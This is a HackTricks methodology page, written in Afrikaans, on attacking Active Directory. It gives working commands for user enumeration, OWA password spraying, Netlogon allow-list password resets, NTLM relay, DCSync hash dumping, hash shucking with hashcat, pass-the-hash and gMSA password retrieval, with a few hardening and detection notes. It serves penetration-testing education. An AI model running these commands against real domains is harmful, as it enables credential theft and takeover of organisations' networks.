# Active Directory-metodologie

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as ’n grondliggende tegnologie waarmee **netwerkadministrateurs** **domeine**, **gebruikers** en **objekte** binne ’n netwerk doeltreffend kan skep en bestuur. Dit is ontwerp om te skaal en maak dit moontlik om ’n groot aantal gebruikers in hanteerbare **groepe** en **subgroepe** te organiseer, terwyl **toegangsregte** op verskillende vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie primêre lae: **domeine**, **bome** en **woude**. ’n **Domein** omvat ’n versameling objekte, soos **gebruikers** of **toestelle**, wat ’n gemeenskaplike databasis deel. **Bome** is groepe van hierdie domeine wat deur ’n gedeelde struktuur verbind word, en ’n **woud** verteenwoordig die versameling van verskeie bome wat deur **vertrouensverhoudings** aan mekaar gekoppel is en die boonste laag van die organisasiestruktuur vorm. Spesifieke **toegangs-** en **kommunikasieregte** kan op elk van hierdie vlakke toegeken word.

Sleutelkonsepte binne **Active Directory** sluit in:

1. **Gids** – Bevat alle inligting oor Active Directory-objekte.
2. **Objek** – Verwys na entiteite binne die gids, insluitend **gebruikers**, **groepe** of **gedeelde vouers**.
3. **Domein** – Dien as ’n houer vir gidsobjekte; verskeie domeine kan binne ’n **woud** bestaan, elk met sy eie versameling objekte.
4. **Boom** – ’n Groepering van domeine wat ’n gemeenskaplike worteldomein deel.
5. **Woud** – Die hoogste vlak van die organisasiestruktuur in Active Directory, bestaande uit verskeie bome met **vertrouensverhoudings** tussen hulle.

**Active Directory Domain Services (AD DS)** omvat ’n reeks dienste wat noodsaaklik is vir gesentraliseerde bestuur en kommunikasie binne ’n netwerk. Hierdie dienste sluit in:

1. **Domeindienste** – Sentreer databerging en bestuur interaksies tussen **gebruikers** en **domeine**, insluitend **stawing** en **soek**-funksies.
2. **Sertifikaatdienste** – Hou toesig oor die skep, verspreiding en bestuur van veilige **digitale sertifikate**.
3. **Lightweight Directory Services** – Ondersteun gidstoepassings deur die **LDAP-protokol**.
4. **Directory Federation Services** – Bied **enkel-aanmelding**-funksies om gebruikers oor verskeie webtoepassings in een sessie te staaf.
5. **Regtebestuur** – Help om materiaal met kopiereg te beskerm deur ongemagtigde verspreiding en gebruik daarvan te beheer.
6. **DNS-diens** – Noodsaaklik vir die oplossing van **domeinname**.

Vir ’n meer gedetailleerde verduideliking, sien: [**TechTerms - Active Directory-definisie**](https://techterms.com/definition/active_directory)

### **Kerberos-stawing**

Om te leer hoe om **’n AD aan te val**, moet jy die **Kerberos-stawingsproses** baie goed **verstaan**.\
[**Lees hierdie bladsy as jy nog nie weet hoe dit werk nie.**](kerberos-authentication.md)

## Kitsgids

Jy kan baie by [https://wadcoms.github.io/](https://wadcoms.github.io) kry om vinnig te sien watter opdragte jy kan uitvoer om ’n AD te enumerate/uitbuit.

> [!WARNING]
> Kerberos-kommunikasie **vereis gewoonlik ’n volledig gekwalifiseerde domeinnaam (FQDN)** sodat die kliënt ’n kaartjie vir die korrekte SPN kan kry. Toegang tot ’n masjien via ’n IP-adres val gewoonlik terug op NTLM in plaas van Kerberos.

## Recon Active Directory (Geen creds/sessies)

As jy net toegang tot ’n AD-omgewing het, maar geen geloofsbriewe/sessies nie, kan jy:

- **Pentest die netwerk:**
  - Skandeer die netwerk, vind masjiene en oop poorte, en probeer om **kwesbaarhede uit te buit** of **geloofsbriewe daaruit te onttrek** (byvoorbeeld, [drukkers kan baie interessante teikens wees](ad-information-in-printers.md)).
  - Deur DNS te enumerate, kan jy inligting oor belangrike bedieners in die domein kry, soos web-, drukker-, share-, vpn- en mediabedieners, ens.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Kyk na die algemene [**Pentesting-metodologie**](../../generic-methodologies-and-resources/pentesting-methodology.md) vir meer inligting oor hoe om dit te doen.
- **Kontroleer vir null- en Guest-toegang op smb-dienste** (dit sal nie op moderne Windows-weergawes werk nie):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - ’n Meer gedetailleerde gids oor hoe om ’n SMB-bediener te enumerate, is hier beskikbaar:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - ’n Meer gedetailleerde gids oor hoe om LDAP te enumerate, is hier beskikbaar (let **veral op die anonieme toegang**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Vergiftig die netwerk**
  - Versamel geloofsbriewe deur [**dienste met Responder na te boots**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Kry toegang tot ’n gasheer deur [**die relay attack uit te buit**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Versamel geloofsbriewe deur [**vals UPnP-dienste met evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) **bloot te stel**
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Onttrek gebruikersname/name uit interne dokumente, sosiale media en dienste (hoofsaaklik web) binne die domeinomgewings, asook uit bronne wat publiek beskikbaar is.
  - As jy die volle name van maatskappywerknemers vind, kan jy verskillende AD-**gebruikersnaamkonvensies** probeer ([**lees dit**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Die algemeenste konvensies is: _NameSurname_, _Name.Surname_, _NamSur_ (3 letters van elk), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _ewekansige letters en 3 ewekansige syfers_ (abc123).
  - Gereedskap:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Gebruikerenumerasie

- **Anonieme SMB/LDAP-enum:** Kyk na die [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html)- en [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md)-bladsye.
- **Kerbrute enum**: Wanneer ’n **ongeldige gebruikersnaam aangevra word**, sal die bediener antwoord met die **Kerberos-foutkode** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wat ons in staat stel om te bepaal dat die gebruikersnaam ongeldig was. **Geldige gebruikersname** sal óf die **TGT in ’n AS-REP**-antwoord lewer, óf die fout _KRB5KDC_ERR_PREAUTH_REQUIRED_, wat aandui dat die gebruiker voorafstawing moet uitvoer.
- **Geen stawing teen MS-NRPC nie**: Gebruik auth-level = 1 (Geen stawing) teen die MS-NRPC (Netlogon)-koppelvlak op domeinbeheerders. Die metode roep die `DsrGetDcNameEx2`-funksie aan nadat dit aan die MS-NRPC-koppelvlak gebind het, om te kontroleer of die gebruiker of rekenaar bestaan sonder enige geloofsbriewe. Die [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)-nutsding implementeer hierdie tipe enumerasie. Die navorsing is [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> beskikbaar.

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access)-bediener**

As jy een van hierdie bedieners in die netwerk gevind het, kan jy ook user enumeration daarteen uitvoer. Jy kan byvoorbeeld die instrument [**MailSniper**](https://github.com/dafthack/MailSniper) gebruik:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Jy kan lyste met gebruikersname in [**hierdie github-repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) en hierdie een ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) vind.
>
> Jy behoort egter die **name van die mense wat by die maatskappy werk** te hê uit die recon-stap wat jy voorheen moes gedoen het. Met die voor- en van kan jy die script [**namemash.py**](https://gist.github.com/superkojiman/11076951) gebruik om moontlik geldige gebruikersname te genereer.

### Misbruik van Netlogon se kwesbare-kanaal-toelatingslys (Onelogon)

Selfs nadat **Zerologon** op die DC reggemaak is, kan rekeninge wat uitdruklik op die toelatingslys geplaas is steeds blootgestel wees aan **verouderde/kwesbare Netlogon-secure-channel-gedrag**. Die riskante konfigurasie is die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** of die ooreenstemmende registerwaarde **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Daardie waarde is ’n **SDDL-sekuriteitsbeskrywer** (sien [Security Descriptors](security-descriptors.md)). Enige rekening of groep waaraan die toepaslike ACE in die DACL toegeken is, kan geteiken word. Byvoorbeeld, `O:BAG:BAD:(A;;RC;;;WD)` plaas effektief **Everyone** op die toelatingslys.

Praktiese operateur-werkvloei:

1. **Identifiseer prinsipe op die toelatingslys** deur beide **SYSVOL/GPO** en die **aktiewe DC-register** na te gaan.
2. **Los SID’s op** wat in die SDDL gevind word na werklike AD-gebruikers/rekenaars, en prioritiseer **DC-masjienrekeninge**, **trust-rekeninge** en ander bevoorregte masjiene.
3. Probeer herhaaldelik **MS-NRPC / Netlogon-verifikasie** as die rekening op die toelatingslys.
4. Nadat ’n raaiskoot suksesvol is, misbruik **Netlogon-wagwoordinstelling** om die teikenrekening se wagwoord terug te stel (die publieke PoC stel dit op ’n leë string).<sup>[[9]](#references)[[10]](#references)</sup>

Vinnige triage- / labvoorbeelde uit die publieke artefak:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notas:

- Die **scanner** is nuttig omdat die effektiewe allow-list in **SYSVOL**, die **registry**, of albei kan wees.
- Die exploit-pad self is belangrik omdat dit **nie Domain Admin-regte vereis nie** sodra ’n kwesbare rekening geïdentifiseer is.
- Dit is besonder gevaarlik om ’n **Domain Controller-masjienrekening**, soos `DC$`, te kompromitteer, want die terugstel van daardie wagwoord kan breër **AD-oornameroetes** direk moontlik maak.
- Die **haalbaarheid van brute force** hang van die modus af: die publieke artefak beskryf ’n meet-in-the-middle-benadering, ’n **24-bis** brute force wanneer ’n ander rekenaarrekening beskikbaar is, en stadiger **32-bis**-variante.

Opsporings- / verhardingsnotas:

- Oudit die allow-list-beleid en verwyder alles behalwe tydelike, uitdruklik vereiste versoenbaarheidsuitsonderings.
- Monitor DC-**System**-gebeurtenisse **5827/5828/5829/5830/5831** om kwesbare Netlogon-verbindings op te spoor wat geweier, ontdek of uitdruklik deur beleid toegelaat word.
- Behandel rekeninge in `VulnerableChannelAllowList` as **hoërisiko** totdat die ouer afhanklikheid verwyder is.

### Om een of meer gebruikersname te ken

Goed, jy weet dus reeds dat jy ’n geldige gebruikersnaam het, maar geen wagwoorde nie... Probeer dan:

- [**ASREPRoast**](asreproast.md): As ’n gebruiker **nie die** kenmerk _DONT_REQ_PREAUTH_ het nie, kan jy ’n **AS_REP-boodskap** vir daardie gebruiker **aanvra**; dit sal data bevat wat met ’n afleiding van die gebruiker se wagwoord geënkripteer is.
- [**Password Spraying**](password-spraying.md): Kom ons probeer die **algemeenste wagwoorde** met elkeen van die ontdekte gebruikers; dalk gebruik een of ander gebruiker ’n swak wagwoord (hou die wagwoordbeleid in gedagte!).
  - Let daarop dat jy ook **OWA-bedieners kan spray** om toegang tot die gebruikers se posbedieners te probeer kry.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Jy kan dalk **challenge-hashes verkry** deur sommige **netwerk**protokolle te **poison**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory-enumerering verskaf gebruikersname, e-posidentifiseerders en naamgewingspatrone, moontlike teikengashere en dienste wat gedwing kan word om te staaf. Gebruik daardie konteks om uitvoerbare NTLM-[**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) en moontlike roetes na die AD-omgewing te identifiseer.

### NetExec-werkspasiegedrewe recon- en relay-houdingkontroles

- Gebruik **`nxcdb`-workspaces** om AD-recon-status per betrokkenheid te hou: `workspace create <name>` skep SQLite-databasisse per protokol onder `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Wissel aansigte met `proto smb|mssql|winrm` en lys versamelde geheime met `creds`. Verwyder sensitiewe data handmatig wanneer jy klaar is: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Vinnige subnet-ontdekking met **`netexec smb <cidr>`** wys **domein**, **OS-bouweergawe**, **SMB-ondertekeningsvereistes** en **Null Auth**. Lede wat `(signing:False)` wys, is **kwesbaar vir relay**, terwyl DC's dikwels ondertekening vereis.
- Genereer **gasheername in /etc/hosts** direk vanaf NetExec-uitvoer om teikening makliker te maak:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Wanneer **SMB relay na die DC geblokkeer word** weens signing, ondersoek steeds die **LDAP**-houding: `netexec ldap <dc>` wys `(signing:None)` / swak channel binding uit. ’n DC wat SMB signing vereis maar LDAP signing gedeaktiveer het, bly ’n geskikte **relay-to-LDAP**-teiken vir misbruik soos **SPN-less RBCD**.

### Credential-lekkasies aan die kliëntkant via drukkers → domeincredential-validering in grootmaat

- Drukker-/webkoppelvlakke **sluit soms gemaskerde admin-wagwoorde in HTML in**. Deur die bron/devtools te bekyk, kan die duidelike teks onthul word (bv. `<input value="<password>">`), wat Basic-auth-toegang tot scan-/drukbewaarplekke moontlik maak.
- Onttrekte druktake kan **plaintext-onboardingdokumente** met wagwoorde per gebruiker bevat. Hou die pare in lyn wanneer jy dit toets:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Steel NTLM Creds

As jy met die **null- of guest-gebruiker toegang tot ander rekenaars of shares** kan kry, kan jy **lêers plaas** (soos ’n SCF-lêer) wat, indien dit op een of ander manier besoek word, **’n NTLM-verifikasie teen jou sal aktiveer**, sodat jy die **NTLM-uitdaging kan steel** om dit te kraak:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandel elke NT-hash wat jy reeds het as ’n kandidaatwagwoord vir ander, stadiger formate waarvan die sleutelmateriaal direk van die NT-hash afgelei word. In plaas daarvan om lang wagwoordfrases in Kerberos RC4-kaartjies, NetNTLM-uitdagings of kasbewyse met brute force te probeer kraak, voer jy die NT-hashes in Hashcat se NT-candidate-modusse in en laat jy dit wagwoordhergebruik bevestig sonder om ooit die gewone teks te ontdek. Dit is veral doeltreffend ná ’n domeinkompromittering, wanneer jy duisende huidige en historiese NT-hashes kan insamel.<sup>[[5]](#references)</sup>

Gebruik shucking wanneer:

- Jy ’n NT-versameling uit DCSync, SAM/SECURITY-dumps of credential vaults het en hergebruik in ander domeine/foreste wil toets.
- Jy RC4-gebaseerde Kerberos-materiaal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-antwoorde of DCC/DCC2-blobs vasvang.
- Jy vinnig hergebruik vir lang, onkraakbare wagwoordfrases wil bewys en onmiddellik via Pass-the-Hash wil beweeg.

Die tegniek **werk nie** teen enkripsietipes waarvan die sleutels nie die NT-hash is nie (bv. Kerberos-etype 17/18 AES). As ’n domein slegs AES afdwing, moet jy terugkeer na die gewone wagwoordmodusse.

#### Bou ’n NT-hash-versameling

- **DCSync/NTDS** – Gebruik `secretsdump.py` met geskiedenis om die grootste moontlike stel NT-hashes (en hul vorige waardes) te kry:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Geskiedenisinskrywings vergroot die kandidaatpoel aansienlik, omdat Microsoft tot 24 vorige hashes per rekening kan stoor. Vir meer maniere om NTDS-geheime te oes, sien:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint-cache-dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (of Mimikatz `lsadump::sam /patch`) onttrek plaaslike SAM/SECURITY-data en kasdomeinaanmeldings (DCC/DCC2). Verwyder duplikate en voeg daardie hashes by dieselfde `nt_candidates.txt`-lys.
- **Volg metadata** – Hou die gebruikersnaam/domein by wat elke hash opgelewer het (selfs al bevat die woordelys net heksadesimale waardes). Wanneer Hashcat die wenkandidaat wys, vertel ooreenstemmende hashes jou onmiddellik watter principal ’n wagwoord hergebruik.
- Verkies kandidate uit dieselfde forest of ’n vertroude forest; dit maksimeer die kans op oorvleueling tydens shucking.

#### Hashcat NT-kandidaatmodusse

| Hash Type                                | Wagwoordmodus | NT-kandidaatmodus |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- NT-kandidaat-insette **moet rou NT-hashes van 32 heksadesimale syfers bly**. Deaktiveer reël-enjins (geen `-r` of hibriede modusse nie), want mangling beskadig die kandidaat-sleutelmateriaal.
- Hierdie modusse is nie inherent vinniger nie, maar die NTLM-sleutelruimte (~30,000 MH/s op ’n M3 Max) is ~100× vinniger as Kerberos RC4 (~300 MH/s). Om ’n saamgestelde NT-lys te toets, is baie goedkoper as om die hele wagwoordruimte in die stadiger formaat te verken.
- Gebruik altyd die **nuutste Hashcat-bou** (`git clone https://github.com/hashcat/hashcat && make install`), want modusse 31500/31600/35300/35400 is onlangs vrygestel.<sup>[[7]](#references)</sup>
- Daar is tans geen NT-modus vir AS-REQ Pre-Auth nie, en AES-etipes (19600/19700) vereis die gewone tekswagwoord, omdat hul sleutels via PBKDF2 van UTF-16LE-wagwoorde afgelei word, nie van rou NT-hashes nie.

#### Voorbeeld – Kerberoast RC4 (modus 35300)

1. Versamel ’n RC4 TGS vir ’n teiken-SPN met ’n gebruiker met lae voorregte (sien die Kerberoast-bladsy vir besonderhede):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Shuck die ticket met jou NT-lys:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat lei die RC4-sleutel uit elke NT-kandidaat af en valideer die `$krb5tgs$23$...`-blob. ’n Pas bevestig dat die diensrekening een van jou bestaande NT-hashes gebruik.

3. Skakel onmiddellik oor via PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Jy kan, indien nodig, die plaintext later herwin met `hashcat -m 1000 <matched_hash> wordlists/`.

#### Voorbeeld – Gestoorde aanmeldbewyse (mode 31600)

1. Dump cached logons vanaf ’n gekompromitteerde werkstasie:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Kopieer die DCC2-reël vir die interessante domeingebruiker na `dcc2_highpriv.txt` en kraak dit:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. ’n Suksesvolle passing lewer die NT-hash wat reeds in jou lys bekend is, wat bewys dat die gebruiker met ’n kasgeheue ’n wagwoord hergebruik. Gebruik dit direk vir PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) of brute-force dit in vinnige NTLM-modus om die string te herstel.

Dieselfde werkvloei geld vir NetNTLM-uitdaag-antwoorde (`-m 27000/27100`) en DCC (`-m 31500`). Sodra ’n passing gevind is, kan jy relay, SMB/WMI/WinRM PtH begin, of die NT-hash weer vanlyn met masks/reëls kraak.



## Enumerating Active Directory MET geloofsbriewe/sessie

Vir hierdie fase moet jy **die geloofsbriewe of ’n sessie van ’n geldige domeinrekening gekompromitteer het.** As jy geldige geloofsbriewe of ’n shell as ’n domeingebruiker het, **moet jy onthou dat die opsies wat vroeër gegee is, steeds opsies is om ander gebruikers te kompromitteer**.

Voordat jy met geverifieerde enumerasie begin, moet jy die **Kerberos double-hop-probleem** verstaan.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerasie

Om ’n rekening te kompromitteer is ’n **groot stap om die domein te assesseer**, omdat dit geverifieerde **Active Directory-enumerasie** moontlik maak:

Wat [**ASREPRoast**](asreproast.md) betref, kan jy nou elke moontlike kwesbare gebruiker vind, en wat [**Password Spraying**](password-spraying.md) betref, kan jy ’n **lys van al die gebruikersname** kry en die wagwoord van die gekompromitteerde rekening, leë wagwoorde en nuwe belowende wagwoorde probeer.

- Jy kan die [**CMD gebruik om basiese recon uit te voer**](../basic-cmd-for-pentesters.md#domain-info)
- Jy kan ook [**powershell vir recon gebruik**](../basic-powershell-for-pentesters/index.html), wat meer stealthy sal wees
- Jy kan ook [**powerview gebruik**](../basic-powershell-for-pentesters/powerview.md) om meer gedetailleerde inligting te onttrek
- Nog ’n uitstekende hulpmiddel vir recon in ’n Active Directory is [**BloodHound**](bloodhound.md). Dit is **nie baie stealthy nie** (afhangend van die versamelingsmetodes wat jy gebruik), maar **as jy nie daaroor omgee nie**, moet jy dit beslis probeer. Vind waar gebruikers RDP kan gebruik, vind paaie na ander groepe, ens.
  - **Ander outomatiese AD-enumerasiehulpmiddels is:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS-rekords van die AD**](ad-dns-records.md), aangesien dit interessante inligting kan bevat.
- ’n **Hulpmiddel met ’n GUI** wat jy kan gebruik om die gids te enumereer, is **AdExplorer.exe** uit die **SysInternal** Suite.
- Jy kan ook die LDAP-databasis met **ldapsearch** deursoek vir geloofsbriewe in die velde _userPassword_ en _unixUserPassword_, of selfs in gebruiker- se _description_- en _info_-notas. ’n Ongemerkte tekenreeks in _info_ wat soos ’n wagwoord lyk, is slegs ’n moontlike kandidaat: bevestig die doel en geldigheid daarvan afsonderlik, en hou notainhoud uit gewone enumerasie-uitvoer. Sien [Wagwoord in AD User-kommentaar op PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) vir ander metodes.
- Gaan **toeganklike** domeinaanmeldings- en skyfkarteringskripte na onder `\\<dc>\NETLOGON` of `\\<dc>\SYSVOL\<domain>\scripts` wanneer jy daarvoor gemagtig is. [Microsoft dokumenteer](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) die NETLOGON-deel se rol as ’n gids vir kripte. Lys eers die name en ondersoek dan slegs relevante, leesbare kripte binne ’n groottelimiet; moenie ’n hele deel uitstort of geloofsbriefwaardes tydens gewone enumerasie wys nie. ’n PowerShell-aanroep na [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **beskerm nie** ’n letterlike wagwoord wat in die skrip gestoor is nie. Die aanroep alleen bewys nie dat ’n geheim hardgekodeer is nie: spoor die werklike invoer na, en verifieer dan afsonderlik die rekening, die geldigheid van die geloofsbriewe en die voorregte. ’n Domeinskrip is ’n hersiening van ’n afgeleë deel en is apart van plaaslike gasheerenumerasie.
- As jy **Linux** gebruik, kan jy die domein ook met [**pywerview**](https://github.com/the-useless-one/pywerview) enumereer.
- Jy kan ook outomatiese hulpmiddels probeer, soos:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Onttrekking van alle domeingebruikers**

  Dit is baie maklik om al die domeingebruikername vanaf Windows te kry (`net user /domain` ,`Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy die volgende gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Selfs al lyk hierdie Enumerasie-afdeling klein, is dit die belangrikste deel van alles. Gaan na die skakels (veral dié oor cmd, powershell, powerview en BloodHound), leer hoe om ’n domein te enumereer en oefen totdat jy gemaklik voel. Tydens ’n assessering is dit die belangrike oomblik om jou pad na DA te vind of te besluit dat niks gedoen kan word nie.

### Voorspelbare voorafgeskepte rekenaarrekeninge -> toegang tot gMSA-wagwoorde

Rekenaarrekeninge wat vir verouderde aansluitings opgevoer is, kan ’n voorspelbare aanvanklike wagwoord behou. NetExec se `pre2k`-module identifiseer die kenmerkende `userAccountControl`-waarde `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) en probeer ’n Kerberos-TGT met die eerste 14 karakters van die rekenaarnaam in kleinletters, sonder die laaste `$`. Beskou hierdie UAC-waarde as ’n manier om moontlike kandidate te kies, eerder as om aan te neem dat lidmaatskap van **Pre-Windows 2000 Compatible Access** op sigself bewys dat die wagwoord swak is.<sup>[[18]](#references)[[20]](#references)</sup>

Gebruik geverifieerde LDAP-enumerasie om die kandidate te toets en suksesvolle TGT’s te stoor. `ALL=True` brei die toetsing uit na voorwerpe buite dié wat deur die verstekfilter `4128` gekies word.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

'n Mislukte verstek-/NTLM-bind maak hierdie bevinding **nie** ongeldig nie: toets met `-k`, 'n FQDN wat na die DC resolve, en 'n klok wat met die KDC gesinchroniseer is. Suksesvolle module-uitvoerings skryf kandidaatlyste en verkreë ccaches onder `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Nadat jy die rekenaarprincipal gekompromitteer het, karteer sy geneste groeplidmaatskappe en uitgaande regte. Veral principals wat in 'n gMSA se `msDS-GroupMSAMembership`-sekuriteitsbeskrywer genoem word, kan `msDS-ManagedPassword` lees; NetExec se `--gmsa`-afvoer wys die toegelate principals en gee die huidige NT-hash terug wanneer die verifiërende rekenaar gemagtig is.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Evalueer dan die herwonne gMSA soos enige ander geloofsbrief: ondersoek plaaslike/domeingroeplidmaatskap, aanmeldregte, SPN’s, delegering en bereikbare dienste voordat jy pass-the-hash probeer. Hierdie ACL-gebaseerde herwinningsroete verskil van [Golden gMSA/dMSA](golden-dmsa-gmsa.md), wat bestuurde wagwoorde aflei nadat die KDS-hoofsleutel gekompromitteer is.<sup>[[20]](#references)</sup>

